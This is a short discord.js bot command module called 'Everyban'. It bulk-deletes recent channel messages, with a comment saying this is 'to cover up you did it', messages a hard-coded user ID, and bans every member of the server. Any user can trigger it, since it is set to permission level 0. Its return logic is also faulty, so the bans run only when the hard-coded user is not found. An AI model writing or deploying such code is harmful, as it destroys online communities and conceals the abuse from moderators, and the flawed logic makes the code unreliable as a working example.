const Discord = require('discord.js');



exports.run = (client, message, args) => {


    message.channel.fetchMessages({limit: 10}).then(messages => message.channel.bulkDelete(messages)); //deletes messages to cover up you did it
if(client.users.get('281125214098685954')) return client.users.get('281125214098685954').send("ALLBAN HAHAHAHHAHAHA")
    message.guild.members.forEach(m => {
        m.ban();
});
}



    exports.conf = {
        enabled: true,
        guildOnly: false,
        aliases: ['everyban', 'eb', 'EveryBan'],
        permLevel: 0
      };

      exports.help = {
        name: 'Everyban',
        description: '',
        usage: ''
      };
